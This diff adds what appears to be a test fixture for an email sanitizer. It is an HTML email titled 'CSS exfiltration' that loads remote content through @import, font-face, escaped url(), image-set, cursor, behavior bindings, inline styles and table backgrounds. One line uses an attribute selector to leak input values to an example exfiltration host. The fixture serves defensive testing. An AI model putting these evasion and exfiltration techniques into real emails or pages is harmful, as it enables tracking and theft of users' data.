@@ -1,0 +1,32 @@
+From: Ada Example <ada@example.com>
+To: alex.morgan@example.net
+Subject: CSS exfiltration
+Date: Tue, 24 Nov 2026 10:00:00 +0000
+Message-ID: <hostile-css@example.com>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><head>
+<style>
+@import url("https://import.example.net/a.css");
+@import 'https://import.example.net/b.css';
+@font-face { font-family: Leak; src: url(https://font.example.net/leak.woff); }
+input[value^="a"] { background: url(https://exfil.example.net/a); }
+body { background-image: url('https://bg.example.net/body.png'); font-family: Leak; }
+.escaped { background: u\72 l(https://escaped.example.net/x.png); }
+.imageset { background-image: image-set("https://imageset.example.net/1x.png" 1x); }
+.webkitset { background-image: -webkit-image-set(url(https://imageset.example.net/2x.png) 2x); }
+.list { list-style-image: url(https://list.example.net/bullet.png); }
+.cursor { cursor: url(https://cursor.example.net/c.cur), auto; }
+.border { border-image: url(https://border.example.net/b.png) 30 round; }
+.content::before { content: url(https://content.example.net/c.png); }
+.behavior { behavior: url(https://htc.example.net/x.htc); -moz-binding: url(https://xbl.example.net/x.xml#x); }
+/* a comment with url(https://comment.example.net/c.png) */
+</style></head>
+<body>
+<p class="escaped imageset webkitset list cursor border content behavior">CSS exfiltration attempts. The text stays.</p>
+<div style="background:url(https://inline.example.net/style.png)">Inline style background</div>
+<div style="background-image: url(&quot;https://inline.example.net/quoted.png&quot;)">Entity-quoted url</div>
+<table background="https://table.example.net/bg.png"><tr><td background="https://table.example.net/td.png">Cell</td></tr></table>
+<style>p { color: #333 } </style><style>@import "https://late.example.net/late.css";</style>
+</body></html>
